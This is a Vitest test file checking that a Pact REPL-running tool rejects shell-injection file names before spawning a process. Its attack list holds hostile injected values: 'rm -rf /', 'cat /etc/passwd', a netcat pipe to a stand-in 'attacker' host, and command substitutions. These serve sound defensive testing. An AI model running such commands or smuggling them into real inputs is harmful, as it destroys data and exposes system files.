/**
 * @fileoverview Shell injection — argv is passed as a string array to spawn,
 *                never interpreted by a shell.
 */

import { describe, test, expect, vi, beforeEach } from 'vitest';
import path from 'node:path';
import { createReplRunTool } from '../../src/tools/repl-run.js';

vi.mock('@pact-community/mcp-shared', async () => {
  const actual = await vi.importActual<
    typeof import('@pact-community/mcp-shared')
  >('@pact-community/mcp-shared');
  return { ...actual, spawnWithOutput: vi.fn() };
});
import { spawnWithOutput } from '@pact-community/mcp-shared';
const mockSpawn = vi.mocked(spawnWithOutput);

const fixtures = path.resolve(import.meta.dirname, '../fixtures');

describe('shell injection', () => {
  beforeEach(() => vi.clearAllMocks());

  test('metacharacter-laden filenames are rejected before spawn', async () => {
    const replRun = createReplRunTool({
      workspaceRoot: fixtures,
      pactBin: 'pact'
    });
    const attacks = [
      'simple.repl; rm -rf /',
      'simple.repl && cat /etc/passwd',
      'simple.repl | nc attacker 1337',
      'simple.repl `id`',
      'simple.repl $(whoami)',
      'simple.repl & echo pwned'
    ];
    for (const file of attacks) {
      await expect(replRun({ file })).rejects.toBeDefined();
    }
    expect(mockSpawn).not.toHaveBeenCalled();
  });

  test('argv passed to spawnWithOutput is a plain string array without meta chars', async () => {
    mockSpawn.mockResolvedValueOnce({
      stdout: 'Load successful',
      stderr: '',
      exitCode: 0
    });
    const replRun = createReplRunTool({
      workspaceRoot: fixtures,
      pactBin: 'pact'
    });
    await replRun({ file: 'simple.repl' });
    expect(mockSpawn).toHaveBeenCalledTimes(1);
    const call = mockSpawn.mock.calls[0]!;
    const cmd = call[0];
    const argv = call[1];
    expect(cmd).toBe('pact');
    expect(Array.isArray(argv)).toBe(true);
    for (const a of argv as string[]) {
      expect(typeof a).toBe('string');
      expect(a).not.toMatch(/[;&|`$]/);
    }
  });

  test('file arg with null byte is rejected', async () => {
    const replRun = createReplRunTool({
      workspaceRoot: fixtures,
      pactBin: 'pact'
    });
    await expect(replRun({ file: 'simple.repl\u0000.txt' })).rejects.toBeDefined();
  });
});
